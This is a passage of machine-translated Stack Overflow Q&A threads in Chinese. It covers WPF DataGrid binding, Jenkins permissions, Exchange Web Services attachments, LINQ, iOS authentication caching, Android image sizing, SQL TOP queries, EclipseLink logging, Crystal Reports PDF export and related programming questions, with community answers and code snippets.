X-Item    200       100           50       50      0 
```

学校可以随时动态添加。现在，如果我添加具有 40 个单位的 School4，我想从默认学校中扣除相同的值（DefaultSchool = 60，School4 = 40）。

我可以在转换器中进行此计算，并且 ItemsSource 也显示更新的值，但它不会反映在 UI 上。

我使用TextBox的`LostFocus`事件`MyDataGrid.Items.Refresh`，它确实更新了UI，但是每次失去焦点时，UI也会闪烁，就像一个令人耳目一新的网页）。

我只需要更新当前行。当我使用时`ExpandoObject`，我不能使用`INotifyPropertyChanged`（我相信？），那么在这种情况下最好的方法应该是什么？

那么我应该如何更新 UI 呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T08:07:02.187

默认 DataGridColumn 有一次绑定，这意味着它仅在第一次加载和显示值，正弦绑定需要事件连接，这对性能开销很小，所以他们可能已经这样做了。我们遇到了同样的问题，唯一的解决方案是使用单元格模板，如下所示。

```
<DataTemplateGridColumn Header="DefaultSchool">
     <DataTemplateGridColumn.CellTemplate>
          <TextBlock Text="{Binding DefaultSchool}"/>
     </DataTemplateGridColumn.CellTemplate>
</DataGridTemplateColumn> 
```

如果您正在动态生成列，那么您将需要这样的东西。

```
var t = new DataTemplate();
t.VisualTree = new FrameworkElementFactory((typeof(TextBlock));
t.VisualTree.SetBinding(new Binding(columnName));

var c = new DataGridTemplateColumn();
c.CellTemplate = t;
c.Header = columnName;

dg.Columns.Add( c ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-20T21:29:46.300

我相信这不是`ExpandoObject`不实施的问题`INotifyPropertyChanged`（因为[它确实](http://msdn.microsoft.com/en-us/library/system.dynamic.expandoobject_events.aspx)）。

我在想的是你的问题是`INotifyCollectionChanged`转换器的组合和使用。发生的情况是，当属性更改时会调用转换器，但在集合更改时不会调用它们。当从绑定集合中添加或删除项目时，这将导致 UI 不更新。

您可以查看这些问题以获取有关此问题的更多信息：

*   [如何在 CollectionChanged 上更新 IValueConverter？](https://stackoverflow.com/questions/1675429/how-do-i-update-an-ivalueconverter-on-collectionchanged)
*   [为什么在 Collection 更改时不调用 Converter？](https://stackoverflow.com/questions/787188/why-is-converter-not-called-when-collection-changes)

您可以通过在转换器中设置断点并查看添加新项目时是否调用它来查看这是否真的是您的问题。如果这确实是问题所在，您可以尝试在不使用转换器的情况下解决此问题，或者使用`MultiValueConverter`也将接收该`Count`属性（仅充当触发器）的 a ，如下所示：

```
<DataGrid>
    <DataGrid.ItemsSource>
        <MultiBinding Converter="{local:MyConverter}">
            <Binding Path="Items" />
            <Binding Path="Items.Count" />
        </MultiBinding>
    </DataGrid.ItemsSource>
</DataGrid> 
```

```
public class MyConverter : MarkupExtension, IMultiValueConverter
{
    public object Convert(object[] values, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        // Your converter logic which will use values[0] (the bound collection).

        // Ignore anything else in the values[] array.
    }

    public object[] ConvertBack(object value, Type[] targetTypes, object parameter, System.Globalization.CultureInfo culture)
    {
        throw new NotImplementedException();
    }

    public override object ProvideValue(IServiceProvider serviceProvider)
    {
        return this;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-22T07:04:09.903

确保 XAML 绑定中有 Mode=TwoWay。

INotifyCollectionChanged 将确保在您添加/删除集合中的项目时绑定将得到通知，但如果您修改/更新集合中的对象（对象 DefaultSchool），则 INotifyCollectionChanged 不会帮助您。

您需要在 School 类中实现 INotifyPropertyChanged 以使绑定在集合中该类的对象的更新/修改时得到通知。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-23T21:43:56.733

尝试像这样设置您的窗口或用户控件数据上下文。datacontext = this.datacontext 并且 itemsource 具有您想要的数据的路径。如果您不设置数据上下文，则 itemsource 无法绑定到您的对象。如果仍然无法正常工作，请尝试在 ItemSource 中的项目上制作数据模板。最后使用 ObservableCollection，这样您就不必实现那些 INotifyProperty ...

# permissions - 将 jenkins 权限映射到具有 NONE、VIEW、EDIT、ALL 权限的外部应用程序

> ID：12954281
> 
> 赞同：4
> 
> 时间：2012-10-18T12:09:39.403
> 
> 标签：permissions, jenkins

我正在使用 jenkins 编写一个用于外部应用程序身份验证的插件。我想将授权逻辑委托给外部应用程序。外部应用程序对用户具有 NONE、VIEW、EDIT 和 ALL 权限。

NONE 是直截了当的 - 什么都不做

ALL 很简单——允许一切

对于 EDIT 和 VIEW，我想要这些权限：

VIEW 应该可以查看所有作业和视图，但是没有配置也不能改变任何东西

EDIT 应该能够查看所有作业和视图，创建新视图，创建新作业，编辑作业，但不能访问 jenkins 系统配置。

我可以在詹金斯看到这些权限：

```
[ 0] Permission[class hudson.model.Hudson,Administer]
[ 1] Permission[class hudson.security.Permission,FullControl]
[ 2] Permission[class hudson.security.Permission,GenericRead]
[ 3] Permission[class hudson.security.Permission,GenericWrite]
[ 4] Permission[class hudson.security.Permission,GenericCreate]
[ 5] Permission[class hudson.security.Permission,GenericUpdate]
[ 6] Permission[class hudson.security.Permission,GenericDelete]
[ 7] Permission[class hudson.security.Permission,GenericConfigure]
[ 8] Permission[class hudson.model.Hudson,Read]
[ 9] Permission[class hudson.model.Hudson,RunScripts]
[10] Permission[interface hudson.model.Item,Create]
[11] Permission[interface hudson.model.Item,Delete]
[12] Permission[interface hudson.model.Item,Configure]
[13] Permission[interface hudson.model.Item,Read]
[14] Permission[interface hudson.model.Item,ExtendedRead]
[15] Permission[interface hudson.model.Item,Build]
[16] Permission[interface hudson.model.Item,Workspace]
[17] Permission[interface hudson.model.Item,WipeOut]
[18] Permission[class hudson.model.View,Create]
[19] Permission[class hudson.model.View,Delete]
[20] Permission[class hudson.model.View,Configure] 
```

我应该将上面列表中的哪些 Jenkins 权限用于 EDIT 和 VIEW？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-24T09:58:51.047

从保守的权利开始：

*   `hudson.security.Permission,Generic*`对于 VIEW 或 EDIT 都没有，也没有（`RunScripts`仅当您注意到需要时才添加 EDIT），
*   EDIT 的其他`hudson.model.*`权限（可能不删除，问题未指定），
*   只有 VIEW 的基本读取权限，`ExtendedRead`只有在没有它的情况下无法查看所需的所有内容时才添加 VIEW（我猜这可能是用于查看作业配置，但请先尝试不使用它）。

对于权威答案，请查看 Jenkins 源代码，但从保守的角度开始反复试验应该只需几次迭代即可为您提供最佳答案。

我猜你想要一个完整的正确权限列表作为答案，但这确实需要在回答之前进行测试，或者仔细检查源以查看这些检查的位置，然后无论如何你都必须测试自己以确保安全（因为这是匿名论坛上的安全相关问题）。

与 Jenkins 文档相关的（也是我知道的）链接，关于实际使用权限，这可能有助于获取源代码：[https ://wiki.jenkins-ci.org/display/JENKINS/Making+your+plugin+表现+在+安全+詹金斯](https://wiki.jenkins-ci.org/display/JENKINS/Making+your+plugin+behave+in+secured+Jenkins)

# exchangewebservices - item.HasAttachments 为真，但集合中没有附件

> ID：12954284
> 
> 赞同：3
> 
> 时间：2012-10-18T12:09:50.023
> 
> 标签：exchangewebservices, exchange-server-2010

我需要从许多邮件中检索和复制附件。问题是每个邮件项目的集合都是空的，即使属性 HasAttachment 为真。

在检索邮件项目后，我是否需要以某种方式加载每个邮件项目的附件集合？

以下代码吐出异常“索引超出范围。”：

```
FindItemsResults<Item> findResults = service.FindItems(
                WellKnownFolderName.Inbox,
                new ItemView(1));

foreach (Item item in findResults.Items)
{
    if (item.HasAttachments && item.Attachments[0] is FileAttachment)
    {
         //Do stuff
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:34:08.280

落在解决方案上；项目。加载（）。我想这是合乎逻辑的，因为轻型应用程序可能对在不需要时收集重型附件不感兴趣。

# android - how to add a button in row of listview whenever particular row is selected?

> ID：12954286
> 
> 赞同：2
> 
> 时间：2012-10-18T12:09:51.450
> 
> 标签：android, listview

我试图在第一次选择行时在列表行中添加一个按钮，并在第二次选择该行时将其删除

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:12:27.093

in your getview function of customListAdapter inflate a layout in which keep visibility of button as GONE,then onclick of listitem change the visibility of that button to VISIBLE.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:12:13.740

in your row xml, add a Button and set visibility to View.GONE. Inplement a clickListener on that row that will toggle visibility between View.VISIBLE and View.GONE

# c# - 从 linq-to-entities 查询向列表添加附加信息

> ID：12954288
> 
> 赞同：0
> 
> 时间：2012-10-18T12:09:57.193
> 
> 标签：c#, linq, linq-to-sql, lambda, linq-to-entities

我正在尝试找到一种更有效的方法来将附加信息从查询中添加到列表中。例如，如果我有一个包含 ObjectID 和 StringA 集合的对象列表，我想根据 ObjectID 查询数据库以检索 StringB 和 StringC：

```
public class SomeObject {
    public int ObjectID { get; set; }
    public string StringA { get; set; }
    public string StringB { get; set; }
    public string StringC { get; set; }
}

public void AddInformationToSomeObjects(List<SomeObject> someObjects)
{
    var listOfIDs = someObjects.Select(so => so.ObjectID).ToList();
    var informationToAdd = db.Table.Where(t => listOfIDs.Contains(t.ObjectID)).Select(t => new { ObjectID = t.ObjectID, StringB = t.StringB, StringC = t.StringC }).ToList();

    foreach (var someObject in someObjects)
    {
        var information = informationToAdd.Where(i => i.ObjectID == someObject.ObjectID).FirstOrDefault();
        someObject.StringB = information.StringB;
        someObject.StringC = information.StringC;
    }
} 
```

有没有办法将查询和赋值组合成一个语句？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:37:12.070

只更新整个`List`...

```
public void AddInformationToSomeObjects(IEnumerable<SomeObject> someObjects)
{
    someObjects =
        from obj in someObjects
        join dbObj in db.Table
        on obj.ObjectID equals dbObj.ObjectID
        select new SomeObject
        {
            ObjectID = obj.ObjectID,
            StringA = obj.StringA,
            StringB = dbObj.StringB,
            StringC = dbObj.StringC
        }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T18:20:45.793

正如 Jan P. 所说，重新获取新列表可能没什么大不了的。但是获得第一个列表涉及一些昂贵的操作（例如获取 blob），您的想法一点也不坏。就像简单的加入一样：

```
public List<SomeObject> AddInformationToSomeObjects(List<SomeObject> someObjects)
{
    var listOfIDs = someObjects.Select(so => so.ObjectID).ToList();
    var informationToAdd = db.Table
        .Where(t => listOfIDs.Contains(t.ObjectID))
        .Select(t => new { 
                            ObjectID = t.ObjectID,
                            StringB = t.StringB,
                            StringC = t.StringC
                        }).ToList();

    return(
        from org in someObjects
        join a in informationToAdd on org.ObjectID equals a.ObjectID
        select new SomeObject {
                                ObjectID = org.ObjectID,
                                StringA = org.StringA,
                                StringB = a.StringB,
                                StringC = a.StringC
                            }).ToList();
} 
```

返回一个新列表而不更改原始列表只是个人喜好（最小化方法/函数的副作用）。

# ios - iOS Webapp 作为主页按钮：使用 ajax 发送的身份验证标头停止工作

> ID：12954295
> 
> 赞同：4
> 
> 时间：2012-10-18T12:10:14.140
> 
> 标签：ios, safari, http-headers, iphone-standalone-web-app

我有一个 web 应用程序，它通过 REST APi 进行身份验证，女巫用用户 ID 和会话令牌响应，这将作为 api 安全端点的授权基本标头与未来的 ajax 请求一起发送。这适用于所有浏览器，包括 iOS Safari。在iOS（iPad）上，当我使用apple-mobile-web-app-capable Meta标签并将该应用程序添加到主屏幕时出现问题：登录后，即使我的授权标头在那里（在网络检查器中查看我的 Mac 上的网络请求选项卡）发送第一个安全呼叫时，我收到 safari Authenticaion Required 弹出窗口，要求我输入密码。

标头是通过 ajaxSetup`beforeSend`属性设置的：

```
xhr.setRequestHeader("Authorization", "Basic " + base64Value) 
```

同样，在所有浏览器上一切都很好，IOS Safari App 和 Home Button 模式都可以，但是当使用 meta:apple-mobile-web-app-capable 时，authenticaion 机制被破坏了。

我确实搜索了很多，但还没有找到解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T11:24:58.283

我的问题现在解决了。Ajax POST 请求在 Safari IOS 6 上被缓存，即使我清理缓存和 cookie，之前缓存的请求也会卡在某个地方。我在另一个 ajax 调用中遇到了相关问题，但我们通过在 REST 拦截器中添加无缓存标头来解决它，但由于某种原因，对我们 API 的登录调用仍在使用缓存响应（旧会话令牌），但仅在 WEB能力模式。在 LOGIN url 的末尾添加时间戳可以解决该问题。

我仍然不明白为什么一个特定的请求永远不会从 WEB CAPABLE MODE 中的历史记录/cookies 中清除.....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-27T19:09:32.267

我在 GET 请求中遇到了这个问题。我的解决方案是将`cache: false`标志添加到`jQuery.ajax()`，这会添加一个带有时间戳的额外 GET 参数以防止缓存。如果您不使用 jQuery，可以在您自己的代码中使用类似的技巧。

POST 请求永远不应该被缓存。这确实是iOS中的一个错误。

jQuery.ajax 文档：[http ://api.jquery.com/jquery.ajax/](http://api.jquery.com/jquery.ajax/)

# android - 图像尺寸和移动设备以及 dpi

> ID：12954297
> 
> 赞同：6
> 
> 时间：2012-10-18T12:10:17.887
> 
> 标签：android, ios, image

这是关于移动设备的图像及其大小的问题。

所以假设我想要一个完整的移动屏幕图像。我假设这里的屏幕是 320*480，看起来是一致的。

当我在 Photoshop 或 MS Paint 或其他任何工具中制作图像时，我可以选择像素/英寸（好吧，也许不是在绘画中，但你明白我的意思）。 *默认为 72 像素/英寸，是否要一直保持这个值？*

某些设备具有更高的 dpi - 我认为“默认”是 160 dpi - 所以对于 240dpi 的设备，要显示我的相同图像，我是否：

1.  将图像从 320*480 放大到 480*640（即 size = oldSize*240/160）或
2.  转到我的图像并将像素/英寸更改为 72 * 240/160？

鉴于 Android 的尺寸如下：

```
xlarge screens are at least 960dp x 720dp
large screens are at least 640dp x 480dp
normal screens are at least 470dp x 320dp
small screens are at least 426dp x 320dp 
```

（来自这个[http://developer.android.com/guide/practices/screens_support.html](http://developer.android.com/guide/practices/screens_support.html)）

我认为通过放大/缩小图像并将它们移动到正确的位置，我可以获得跨设备兼容性。

接下来，与其增加图像大小，不如只制作一个非常大的图像并根据需要缩小它？

对于 iPad 和 iPhone，这是完全相同的问题，只是数字不同！这些手机是 320x480，Retina 是 640x960，iPad 是 1024x768，而 Retina 又是原来的四倍。

那么图像放大还是 Photoshop 中的像素/英寸放大？

我想最后我问的是：
Photoshop中推荐的图像像素/英寸是多少？
这个数字会改变，还是图像大小会改变？
假设 Android 的图像，h,m,l 文件夹中的图像大小应该是 Android 规范中值的最小值，还是略低于最大值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:18:26.537

位图要求类似于为打印和 Web 准备图形。如果您有任何印刷制作经验，您就会知道 72 PPI 的图像在放大和打印时会显得非常像素化和模糊。相反，您需要将图像重做为矢量图像或使用高分辨率照片，然后将文件的分辨率设置为 300 PPI 左右，以便在不损失图像质量的情况下打印它。Android 的屏幕密度工作类似，除了我们不更改文件的分辨率，只更改图像的大小（即标准**72 PPI 即可**）。

不要在 photoshop 或 gimp 中增加任何分辨率来更改图像，仅保留 72ppi。

只需从基线缩放图像，即 mdpi=1。

```
75 × 75 for low-density screens (i.e. ×0.75); 
100 × 100 for medium-density screens (our baseline);
133 x 133 fpr TVDPI (1.33)(no need to supply graphics android will auto scale from hdpi) 213/160=1.33125
150 × 150 for high-density screens (×1.5);
200 × 200 for extra high-density screens (×2.0). 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-27T12:01:37.547

我还发现了关于整个“ppi”问题的有趣讨论：

[dpi 的神话](http://www.webdesignerdepot.com/2010/02/the-myth-of-dpi/)，它假定“ppi”是一个本质上不好的问题，因为 72 dpi 的 300 px * 100 px 图像与 144dpi 的 300 px * 100 px 图像具有相同的像素。

因此，在为 Web 设计时，适当地设置像素大小是最重要的——dpi 可以是 144 或 1 或 10 亿，它不会影响计算机显示图像的方式。

# codeigniter - 带 sql 的代码点火器

> ID：12954300
> 
> 赞同：0
> 
> 时间：2012-10-18T12:10:25.173
> 
> 标签：codeigniter

```
public function display( $date )
        {
            $this->db->select('*');         
            $this->db->from('event');
                 $this->db->where('start_date','$date');
                     $res = $this->db->get()->result_array();           
                 return $res;   
        }
     } 
```

我在codeigniter中使用此代码从我的数据库中获取数据。但是我收到错误消息“从sql中的字符串转换日期和/或时间时转换失败”。请大家帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:22:43.900

```
public function display( $date )
        {
            $this->db->select('*');         
            $this->db->from('event');
                 $this->db->where('start_date',cast($date as date));
                     $res = $this->db->get()->result_array();           
                 return $res;   
        }
     } 
```

它应该是正确的日期格式来投射 $date 应该是 yyyy-mm-dd 的格式，否则像这样构造您发送日期的 adate 格式

```
$newdate=date_create($date);
$perfectdate=date_format($newdate,'Y-m-d'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:15:09.607

不带 '' 分号的 $date 变量：

```
public function display( $date ) { 
$this->db->select('*');
$this->db->from('event'); $this->db->where('start_date',$date); 
$res = $this->db->get()->result_array();
return $res;
} 
```

# c++ - 如何将类中的静态 const 结构用作真正的 const - 即数组大小

> ID：12954301
> 
> 赞同：1
> 
> 时间：2012-10-18T12:10:28.027
> 
> 标签：c++, struct, initialization, constants, member

我被要求为以下问题提供解决方案：

有一个结构定义了一些 int 参数：

```
struct B {
  int a;
  int b;
}; 
```

有人想将此结构定义为其他类中的 const 静态成员**（不仅为此`class A`——还有其他类期望具有相同的一组常量）**。

有人想将它们用作真正的积分常数：

```
// .h file
class A {
public:
  static const B c; // cannot initialize here - this is not integral constant
};
// .cpp file
const B A::c = {1,2}; 
```

但不能使用此常量来制作例如数组：

```
float a[A::c.a]; 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:16:04.007

如果你这样做`A::c` `constexpr`，你可以内联初始化它并将其成员用作常量：

```
struct A {
    static constexpr B c = {1, 2};
};

float a[A::c.a]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:10:28.027

我找到的解决方案是使用 const 成员更改为`struct`。`template` `struct`

```
template <int AV, int BV>
struct B {
  static const int a = AV;
  static const int b = BV;
};
template <int AV, int BV>
const int B<AV,BV>::a;
template <int AV, int BV>
const int B<AV,BV>::b; 
```

和用法：

```
// .h file
class A {
public:
  typedef B<1,2> c; 
}; 
```

还有一个数组：

```
float a[A::c::a]; 
//          ^^ - previously was . (dot) 
```

# sql-server - 如何从嵌套选择中选择最大 ID？

> ID：12954302
> 
> 赞同：0
> 
> 时间：2012-10-18T12:10:29.267
> 
> 标签：sql-server, tsql

我想从嵌套选择中选择最大 ID。

这是我的查询：

```
select max(Id) from (SELECT TOP 100 Id FROM [MyTable]) t 
```

此*选择*应返回 100，但它实际上返回*MyTable*的最大 id 。

PS *MyTable*包含 100 000 条记录，因此查询返回 100 000。

**这是一个例子：**

*返回 100（没关系）*

```
SELECT TOP 100 Id FROM [MyTable] 
```

*返回 100 000，但我想选择“SELECT TOP 100 Id FROM [MyTable]”的最大 id*

```
select max(Id) from (SELECT TOP 100 Id FROM [MyTable]) t 
```

*返回 100 000，但我想选择“SELECT TOP 100 Id FROM [MyTable] where Id > 100”的最大 id*

```
select max(Id) from (SELECT TOP 100 Id FROM [MyTable] where Id > 100) t 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:27:51.483

`TOP`带但不带的查询`ORDER BY`，例如您的：

```
SELECT TOP 100 
    Id 
FROM tableX ; 
```

**不返回一致的结果。**上面的意思是*“给我看 100 个 ID，我不在乎，表中有数百万个 ID”*。在您运行查询时，DBMS 可以自由地返回它选择的任何 100。它甚至可以选择在前 2 年寄回同样的 100 个，然后突然改变主意并退回另外 100 个。

事实上，这就是你所看到的，当它用于子查询时，优化器将查询**“给我任何 100 个 ID 的最大值”**转换为***“给我表的所有 ID 的最大值”***

* * *

将该查询更改为（您可以使用任何`ORDER BY`选择）：

```
SELECT TOP 100 
    Id 
FROM tableX 
  ORDER BY Id ; 
```

单独使用它并用作子查询，您将拥有一致的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:12:56.487

I think nested query just return top 100 rows and id 100000 is one of them. Try this

```
select max(Id) from (SELECT TOP 100 Id FROM [MyTable] order by Id asc) t 
```

# jpa - Glassfish v3 服务器上的 JPA 日志记录级别

> ID：12954305
> 
> 赞同：5
> 
> 时间：2012-10-18T12:10:38.647
> 
> 标签：jpa, glassfish-3

```
<property name="eclipselink.logging.level" value="FINE" /> 
```

如何按服务器设置日志记录级别。我想在我的开发服务器上看到 Level.FINE。但当然只有 Level.WARNING 在生产服务器上。

如果我将上面的行放入persistence.xml，那么它会在两台机器上自动设置。我必须记得手动关闭它。这当然是危险的。

非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:14:39.283

你可以参考[EclipseLink/Examples/JPA/Logging](http://wiki.eclipse.org/EclipseLink/Examples/JPA/Logging)

> 注意：将 eclipselink.logging.level 设置为 FINE 是不够的（从 EclipseLink 2.4.0 - Juno 开始），您必须将 eclipselink.logging.level.sql 设置为 FINE。

```
<property name="eclipselink.logging.level" value="FINE"/>
<property name="eclipselink.logging.level.sql" value="FINE"/>
<property name="eclipselink.logging.parameters" value="true"/> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-03-07T19:10:50.613

我自己一直在为此苦苦挣扎。我发现在 GlassFish（至少在 3.1.2）上，您可以从 GlassFish 域/*域*/配置目录中编辑 logging.properties 文件。

找到 org.eclipse.persistence.session.level 条目并将其更改如下：

```
org.eclipse.persistence.session.level=FINE 
```

除此之外，我发现我需要添加这两个条目：

```
org.eclipse.persistence.level = FINE
org.eclipse.persistence.sql.level = FINE 
```

像这样编辑 logging.properties 文件时，无需在 persistence.xml 文件中添加任何有关日志记录的内容，它会满足您的上述要求。

***注意**：我还没有设法让 eclipselink.logging.parameter=true 在 persistence.xml 中工作（它不能在 logging.properties 中分配）。因此，SQL 日志记录有效，只是不适用于完整的绑定转储。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:54:46.787

我将这些行添加到 logging.properties 文件中，并且无需将其添加到 persistence.xml 即可工作。所以它现在取决于服务器。

```
eclipselink.logging.level=FINE
eclipselink.logging.level.sql=FINE
eclipselink.logging.parameters=true 
```

# crystal-reports - 如何在本地系统中将 Crystal 报表导出为 PDF？

> ID：12954306
> 
> 赞同：2
> 
> 时间：2012-10-18T12:10:38.970
> 
> 标签：crystal-reports, export-to-pdf

我需要以`PDF`格式将水晶报表导出到本地系统。

我已经使用过`ExporttoDesk`，但它保存在服务器中。我需要将其提供给用户。

可能吗 ？

我用过`ExporttoStream`。但它也不适合我。

请告诉我实现这一目标的方法。

谢谢，拉克什。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:18:33.210

Try this on Button's click

```
try
        {
            ExportOptions CrExportOptions ;
            DiskFileDestinationOptions CrDiskFileDestinationOptions = new DiskFileDestinationOptions();
            PdfRtfWordFormatOptions CrFormatTypeOptions = new PdfRtfWordFormatOptions();
            CrDiskFileDestinationOptions.DiskFileName = "c:\\csharp.net-informations.pdf";
            CrExportOptions = cryRpt.ExportOptions;
            {
                CrExportOptions.ExportDestinationType = ExportDestinationType.DiskFile;
                CrExportOptions.ExportFormatType = ExportFormatType.PortableDocFormat;
                CrExportOptions.DestinationOptions = CrDiskFileDestinationOptions;
                CrExportOptions.FormatOptions = CrFormatTypeOptions;
            }
            cryRpt.Export();
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        } 
```

Read its explanation [here](http://csharp.net-informations.com/crystal-reports/csharp-crystal-reports-export-pdf.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-01-23T07:51:05.790

**当我们有参数时怎么做？**

```
 Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
        Dim Report As ReportDocument = New ReportDocument()
        Report.Load(Server.MapPath("~/CrystalReport.rpt"))
        Report.SetDatabaseLogon("sa", "######", "IT250WS", "demo")
        CrystalReportViewer1.ReportSource = Report
    End Sub

    Protected Sub btnPDF_Click(ByVal sender As Object, ByVal e As EventArgs)
        Dim Report As ReportDocument = New ReportDocument()
        Report.Load(Server.MapPath("~/CrystalReport.rpt"))
        Report.SetParameterValue("@EmpId", 1)
        Report.SetDatabaseLogon("sa", "######", "IT250WS", "demo")
        Response.Buffer = False
        Response.ClearContent()
        Response.ClearHeaders()
        Report.ExportToHttpResponse(ExportFormatType.PortableDocFormat, Response, True, "File_Name")
        Response.[End]()
    End Sub 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2018-06-06T14:14:37.227

答案为时已晚，但它可能对像我这样的其他人有用。

```
using CrystalDecisions.CrystalReports.Engine;
using CrystalDecisions.Shared;

protected void Page_Load(object sender, EventArgs e)
    {
        ReportDocument pdfReport = new ReportDocument();
        pdfReport.Load(Server.MapPath("ExportToPdf.rpt"));
        pdfReport.SetDatabaseLogon("amitjain","password", @"AMITJAIN\SQL", "Northwind");
        CrystalReportViewer1.ReportSource = pdfReport;
    }

    protected void btnExport_Click(object sender, EventArgs e)
    {
        ReportDocument pdfReport = new ReportDocument();
        pdfReport.Load(Server.MapPath("ExportToPdf.rpt"));
        pdfReport.SetDatabaseLogon("user", "password", @"AMITJAIN\SQL", "Northwind");
        Response.Buffer = false;
        Response.ClearContent();
        Response.ClearHeaders();
        pdfReport.ExportToHttpResponse(ExportFormatType.PortableDocFormat, Response, true, "Employees");
        Response.End();
    } 
```

[http://csharpdotnetfreak.blogspot.com/2012/01/export-crystalreports-to-pdf-word-excel.html](http://csharpdotnetfreak.blogspot.com/2012/01/export-crystalreports-to-pdf-word-excel.html)

测试和工作。

# objective-c - 在呼叫返回之前隐藏警报视图？

> ID：12954311
> 
> 赞同：0
> 
> 时间：2012-10-18T12:11:07.577
> 
> 标签：objective-c, ios, uialertview

当用户单击按钮时，我有带有按钮的警报视图程序进入长时间循环我想在我调用这个之前隐藏警报视图，而我已经搜索了类委托并且我得到了

```
// Called when a button is clicked. The view will be automatically dismissed "**after**" this call returns
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex 
```

如何在此调用返回**之前隐藏警报视图**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:22:42.880

你可以使用

```
- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex 
```

而不是`clickedButtonAtIndex`. 在关闭警报视图*后*`didDismissWithButtonIndex`调用。

 *您不能“立即隐藏”警报视图，因为只有在程序控制返回到主运行循环时才能对用户界面进行任何更改。

（更好的解决方案可能是将长时间运行的任务移动到后台线程，这样主线程就不会被阻塞并且用户界面保持响应。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:13:49.597

只需添加：

```
 [alertView dismissWithClickedButtonIndex:buttonIndex animated:YES]; 
```

进入

```
 - (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-20T11:35:27.673

这是我经过多次尝试后建立的解决方案

```
[self performSelector:@selector(`call Method`) withObject:nil afterDelay:1] 
```*

# sql-server - 使用 SSIS 导出到 Excel 时保留公式

> ID：12954314
> 
> 赞同：1
> 
> 时间：2012-10-18T12:11:24.557
> 
> 标签：sql-server, excel, visual-studio-2008, ssis, export-to-excel

我目前正在使用模板生成 Excel，以使用 SSIS 将数据从我的数据库导出到每日报告。

这个模板是一个大约5张工作表的工作簿，其中只有1张需要自动填写。此工作表有大约 20 列，其中 2 列使用 Vlookups 根据前一列中的值自动填充值。这就像一个 ID-Name 对。我需要将 ID 填充作为我的数据库导出的一部分，而名称应该自动填充。这个 ID-Name 关系保留在表 2 中，我没有涉及。

我的问题是这个：公式应用于这两列大约 150 行（我不希望有更多记录）。因此，如果我的数据库返回 120 个结果，我希望来自 SSIS 的最终 Excel 报告包含从 A2 到 T122 的记录。但是，发生的事情是，一旦我的 SSIS 包执行，我将得到一个前 150 行空白的 Excel 文件......然后我的 120 个结果被填写。这些基于公式的名称列的值“#NA”时ID 列为空。

我该如何解决这个问题？如果我重新设计 Excel 公式以在不存在 ID 值时存储一个空字符串而不是 #NA，我是否能够解决这个问题？我的最终用户需要将这些公式保留在他的最终 Excel 输出中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:11:24.557

如果参考字段为空，我不确定您是否可以设计一个填充空字符串的 Vlookup，但这是我想到的第一个建议。

我的理解是 SSIS 引擎可能会看到这些 #NA 值并假设这些行已经有有意义的数据，因此回避而不是覆盖它们。某处可能有一个覆盖属性，我还没有找到。

# ios - CGImageGetWidth(workingImage.CGImage) 和 workingImage.size.width 有什么区别吗？

> ID：12954319
> 
> 赞同：3
> 
> 时间：2012-10-18T12:11:32.563
> 
> 标签：ios, objective-c, image-processing, uiimage, quartz-graphics

`CGImageGetWidth(workingImage.CGImage)`和有什么区别`workingImage.size.width`吗？第一个更快或更安全？我知道在第二种情况下，我直接获得了价值。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:30:26.750

实际上它们都返回相同的结果。`CGImageGetWidth(Image.CGImage)`返回位图图像宽度，`Image.size.width`返回 UIImage 宽度。如果你问安全/快速，我认为第一个会更快，因为它来自**ApplicationServices**框架，第二个来自**UIKit**框架。希望这可以帮助你..

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-02-15T12:43:23.537

假设`image`a `UIImage *`，`CGImageGetWidth(image.CGImage)`返回以像素为单位的宽度，而`image.size.width`以屏幕坐标返回宽度，即像素宽度除以`image.scale`，这通常是当前显示器的比例因子（大多数 Retina 设备上为 2，iPhone 6 Plus 上为 3），尽管它可能是任意值，具体取决于图像的创建方式。

